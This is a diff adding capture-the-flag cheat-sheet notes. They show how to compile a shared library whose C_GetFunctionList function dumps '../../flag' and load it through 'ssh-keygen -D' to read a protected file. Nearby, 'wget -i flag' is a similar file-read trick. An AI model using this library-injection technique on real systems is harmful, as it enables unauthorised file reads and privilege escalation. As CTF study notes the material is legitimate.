@@ -124,6 +124,20 @@ wget -i flag
 
 
 
+ssh-keygen
+		//hack.c
+	int main(int argc,char const *argv[]){
+	    puts("hello world");
+	}
+	// or static void inject() __attribute__((constructor));
+	//void inject(){}
+	int C_GetFunctionList(){
+	    sendfile(1,open("../../flag",0),0,4096);
+	}
+	
+	gcc -shared hack.c 
+	ssh-keygen -D ./a.out #get the flag
+
 
 
 
